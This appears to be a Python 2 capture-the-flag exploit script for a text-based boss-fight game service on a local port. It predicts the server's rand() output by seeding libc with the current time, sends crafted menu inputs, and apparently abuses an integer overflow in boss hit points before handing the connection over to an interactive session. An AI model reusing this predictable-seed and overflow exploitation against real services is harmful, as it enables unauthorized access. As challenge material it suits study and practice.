from ctypes import CDLL
from time import sleep
import sys
import socket
import telnetlib

libc = CDLL('libc.so.6')
last_rand = None
def srand(seed):
	print 'srand:', hex(seed)
	libc.srand(seed)
def rand():
	r = libc.rand()
	print 'rand:', hex(r)
	last_rand = r
	return r
time = libc.time

def rw(t):
	d = ''
	while t not in d:
		c = p.recv(1)
		sys.stdout.write(c)
		if c == '':
			print 'Socket Error'
			exit()
		d += c
	return d
ii = lambda x: p.send(str(x) + '\n')

def menu():
	rw('6. Exit\n')
p = socket.create_connection(('0.0.0.0', 30303))
t = telnetlib.Telnet()
srand(time(0))
t.sock = p
bosshp = [100, 1000, 3000, 0x7FFFFFFFFFFFFFFE]
print 2 ** 63 - 2
print bosshp[3]
assert bosshp[3] == 2 ** 63 - 2
ch = lambda: [1, 3, 2, 1][rand() % 4]
menu()
ii(3)
ii(3)

def iceball():
	return (rand() & 0xffff) % 1000
skill = iceball

for i in range(4):
	if i == 3:
		def icesword():
			return 0xFFFFFFFF
		skill = icesword
		for i in range(5):
			menu()
			ii(3)
			ii(2)
			payload = ''
			for i in range(3):
				damage = rand()
				choice = ch()
				payload += ' %d %d' % (2, choice)
			menu()
			ii(payload)
			sleep(0.5)
			ii(3)
			ii(7)
			menu()
			damage = rand()
			choice = ch()
			ii(2)
			ii(choice)
			t.interact()
			sleep(2)
	while bosshp[0] >= 0:
		print '=' * 500
		menu()
		damage = skill()
		choice = ch()
		print hex(damage)
		ii(2)
		ii(choice)
		if i == 2:
			print bosshp
		bosshp[0] -= damage
		print bosshp

	bosshp.pop(0)

print 'triggered'
print '=' * 80
rw('what')
p.kill()